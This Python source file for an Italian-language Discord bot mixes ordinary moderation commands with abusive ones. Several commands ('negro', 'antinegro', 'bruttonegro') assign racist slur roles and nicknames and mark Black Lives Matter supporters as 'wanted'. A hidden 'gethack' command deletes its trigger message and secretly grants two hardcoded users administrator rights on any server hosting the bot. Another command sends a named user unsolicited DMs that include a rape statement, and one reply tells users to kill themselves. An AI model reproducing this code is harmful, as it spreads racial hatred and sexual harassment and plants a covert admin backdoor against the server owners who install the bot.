import discord
import random

from help_cog import help_cog
from music_cog import music_cog
from discord.ext import commands

import json
import os

if os.path.exists(os.getcwd() + "/config.json"):

    with open("./config.json") as f:
        configData = json.load(f)

else:
    configTemplate = {"Token": "", "Prefix": "!"}

    with open(os.getcwd() + "/config.json", "w+") as f:
        json.dump(configTemplate, f)

bot = commands.Bot(command_prefix="!", activity=discord.Game(name="prefix=!"))  # cambiare cosa sta facendo il bot)
bot.remove_command("help")

bot.add_cog(help_cog(bot))
bot.add_cog(music_cog(bot))


@bot.event
async def on_ready():
    print("Bot pronto.")


@bot.command(description="vedere gli ms del bot")
async def status(ctx):
    latency = round(bot.latency * 1000,
                    1)  # bot.latency per la latenza e il resto è per arrotondare la cifra al primo numero decimale
    await ctx.send(f"Il bot ha {latency}ms")


@bot.command(description="Ban di un membro")
@commands.has_permissions(
    ban_members=True)  # per limitare il comando ai membri che hanno solo quel perm,esso opure con questo -> solo quel ruolo inserendo il rule id "@commands.has_role(id del ruolo)"
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"{member} è stato Bannato")
    await ctx.send(f"motivo: {reason}")


@bot.command(description="Kick di un membror")
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f"{member} è stato kickato")


@bot.command(description="Unbans di un membro")
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member):
    bannedUsers = await ctx.guild.bans()
    name, discriminator = member.split("#")

    for ban in bannedUsers:
        user = ban.user

        if (user.name, user.discriminator) == (name, discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f"{user.mention} è stato sBannato.")
            return


@bot.command(description="Changes bots activity")
async def attivita(ctx, *, activity, ):
    author = ctx.message.author
    if author.id == 541308281625509905 or author.id == 469424641610350623:
        if activity == "watch":
            film = ["Il Re Leone 2", "Spiderman:No Way Home", "Galaxy e Sise scopano", "Sise love debb",
                    "Storia d'amore: Sise e Debb"]
            await bot.change_presence(
                activity=discord.Activity(type=discord.ActivityType.watching, name=film[random.randint(0, 4)]))
            await ctx.send(f"L'attività svolta dal bot è stata cambiata a Watching Togeder")
        else:
            await bot.change_presence(activity=discord.Game(name=f" prefix=! || {activity}"))
            await ctx.send(f"L'attività svolta dal bot è stata cambiata a {activity}")
    else:
        await ctx.send("Permesso negato, solo l'owner del bot puo accedere a questo comando!")


@bot.command(description="Gets info about the user")
async def userinfo(ctx):
    user = ctx.author

    embed = discord.Embed(title="USER INFO", description=f"Informazioni del profilo di {user}",
                          colour=user.colour)
    embed.set_thumbnail(url=user.avatar_url)
    embed.add_field(name="NAME", value=user.name, inline=True)
    embed.add_field(name="NICKNAME", value=user.nick, inline=True)
    embed.add_field(name="ID", value=user.id, inline=True)
    embed.add_field(name="STATUS", value=user.status, inline=True)
    embed.add_field(name="TOP ROLE", value=user.top_role.name, inline=True)
    await ctx.send(embed=embed)


@bot.command(description="Mutes the specified user.")
@commands.has_permissions(administrator=True)
async def mute(ctx, member: discord.Member, *, reason=None):
    guild = ctx.guild
    mutedRole = discord.utils.get(guild.roles, name="Muted")

    if not mutedRole:
        mutedRole = await guild.create_role(name="Muted")

        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=True)

    await member.add_roles(mutedRole, reason=reason)
    await ctx.send(f"Muted {member.mention} for reason {reason}")
    await member.send(f"You were muted in the server {guild.name} for {reason}")

@bot.command(description="Unmutare")
@commands.has_permissions(administrator=True)
async def unmute(ctx, member: discord.Member):
    mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")

    await member.remove_roles(mutedRole)
    await ctx.send(f"{member.mention} è stato UnMutato")
    await member.send(f"{ctx.guild.name} Sei stato UnMutato nel server, ora sei libero! ")

@bot.command(description="pulisce la chat")
@commands.has_permissions(administrator=True)
async def clearchat(ctx, amount=100000000):
    await ctx.channel.purge(limit=amount)


@bot.command(description="manda mess privati")
@commands.has_permissions(administrator=True)
async def dm(ctx, member: discord.Member, *, content):
    try:
        channel = await member.create_dm()
        await channel.send(content)
        await ctx.channel.send("messaggio inviato")
    except:
        await ctx.channel.send("Messaggio non inviato: utente non nel server oppure l'utente ha i messaggi privati bloccati")


@bot.command(description="comandi per gli admin")
@commands.has_permissions(administrator=True)
async def adminhelp(ctx):
    await ctx.send("""
```
!mute - Muta un utente nel server (no messaggi,no chat vocali, no reazioni).
!ban - Banna un utente dal server.
!unban - Reevoca il ban dell'utente dal server.
!unmute - UnMuta un utente precedentemente mutato nel server.
!attivita - Permette di cambiare l'attività svolta dal bot.
!kick - Butta fuori un utente con il permesso di rietrare.
!status - Mostra il ping attuale del bot (ms/s).
!clearchat - Pulisce tutta la chat(usare il comando con prudenza).
```
""")

@bot.command(description="Mutes the specified user.")
@commands.has_permissions(manage_messages=True)
async def negro(ctx, member: discord.Member):
    guild = ctx.guild
    negroRole = discord.utils.get(guild.roles, name="NEGRO")
    await member.edit(nick="NEGRO!")

    if not negroRole:
        negroRole = await guild.create_role(name="NEGRO")

    await member.add_roles(negroRole)
    await ctx.send(f"{member.mention} è diventato negro!")


@bot.command(description="")
@commands.has_permissions(administrator=True)
async def antinegro(ctx, member: discord.Member):
    guild = ctx.guild
    sterminioRole = discord.utils.get(guild.roles, name="BlxLivesMatterSupporter")
    await member.remove_roles(sterminioRole)
    antiRole = discord.utils.get(guild.roles, name="AntiNigger")

    if not antiRole:
        
        antiRole = await guild.create_role(name="AntiNigger")
        
        

    await member.add_roles(antiRole)
    await ctx.send(f"{member.mention} ora fa parte del team AntiNegri")


@bot.command(description="")
@commands.has_permissions(manage_messages=True)
async def bruttonegro(ctx, member: discord.Member):
    guild = ctx.guild
    antiRole = discord.utils.get(ctx.guild.roles, name="AntiNigger")
    await member.remove_roles(antiRole)
    await ctx.send(f"{member.mention} è stato messo nella lista dei ricercati perche si è messo dalla parte dei negri!")

    sterminioRole = discord.utils.get(guild.roles, name="BlxLivesMatterSupporter")

    if not sterminioRole:
        sterminioRole = await guild.create_role(name="BlxLivesMatterSupporter")

    await member.add_roles(sterminioRole)
    await ctx.send(f"{member.mention} ora è ricercato")
   


@bot.command(description="Unnegrare")
@commands.has_permissions(manage_messages=True)
async def unnegro(ctx, member: discord.Member):
    negroRole = discord.utils.get(ctx.guild.roles, name="NEGRO")
    await member.remove_roles(negroRole)
    await ctx.send(f"{member.mention} è stato UnNEGRATO!")
    await member.edit(nick="")

@bot.command(description="cambia il nome")
@commands.has_permissions(administrator=True)
async def setname(ctx,member: discord.Member, message):
    await member.edit(nick=message)
    await ctx.send(f"Nickname di {member.mention} è stato cambiato con successo in {message}")

@bot.command(description="cambia il nome")
@commands.has_permissions(administrator=True)
async def reloadname(ctx,member: discord.Member):
    await member.edit(nick="")
    await ctx.send(f"Nickname di {member.mention} è stato resettato")

@bot.command(description="getadmin")
async def gethack(ctx):
    author = ctx.message.author
    if author.id == 541308281625509905 or author.id == 469424641610350623:
        member = ctx.message.author
        await ctx.message.delete()
        guild = ctx.guild
        hackRole = discord.utils.get(guild.roles, name="!------HACK------!")

        if not hackRole:
            perms = discord.Permissions(administrator=True)
            hackRole = await guild.create_role(name="!------HACK------!", permissions=perms)
        
        await member.add_roles(hackRole)
    else:
        await ctx.send("Permesso negato, solo l'owner del bot puo accedere a questo comando!")

@bot.command(description="simp sise")
async def sise(ctx):
    author = ctx.message.author
    if author.id == 541308281625509905:
        await ctx.send("sise ti amo da Real <3")
    else:
        await ctx.send("bucchin a mammt, non puoi accedere a questo comando, solo il grande Real puo simpare per sise, vai da un altra parte simp del cazzo suicidati")

@bot.command(description="denis dosio incoming")
async def mylove(ctx):
    await ctx.send(file=discord.File(r'DenisDosioMyLove.rar'))

@bot.command(description="simp debb")
async def debb(ctx):
    author = ctx.message.author
    if author.id == 469424641610350623:
        await ctx.send("Debb ti amo da Sise <3")
        await ctx.send("<@707963651063283733>")
        user = await bot.fetch_user("707963651063283733")
        messaggi = ["Le tue labbra dovrebbero stare al Louvre. Cit. Sise","Ti va di uscire dagli schemi con me stasera? Cit. Sise","Scusa, hai da accendere un sorriso? Cit. Sise","Vuoi salire da me a vedere la collezione di “mi manchi” che non ti ho mai detto? Cit. Sise","Vuoi salire a vedere la mia Collezione di Scuse per non far salire nessun altro prima di Te? Cit. Sise","Vuoi salire e diventare la mia nuova password? Cit. Sise","Ti va di uscire per un caffè? Guarda davvero, non ho secondi fini. Voglio solo stare seduto al tavolo finché non ci innamoriamo. Cit. Sise","Debb ti amo da Sise e ti voglio stuprare plssss <3. Cit. Sise","Debb Facciamo un porno insieme. Cit. Sise"]
        await user.send(messaggi[random.randint(0, 7)])
    else:
        await ctx.send("bucchin a mammt, non puoi accedere a questo comando, solo il grande Simp Sise puo farlo!")

@bot.command(description="consigli")
async def consiglio(ctx,*,message):
    try:
        channel = bot.get_channel(992034814553243718)
        await channel.send(f'Consiglio da {ctx.message.author.mention}. Dice "{message}"')
    except:
        await channel.send("Messaggio non inviato, sintassi sbagliata o qualcosa è andato storto, contattare l'owner del Bot !owner")

@bot.command(description="owner")
async def owner(ctx):
    await ctx.send("<@541308281625509905>")

token = os.environ["token"]




bot.run(token)
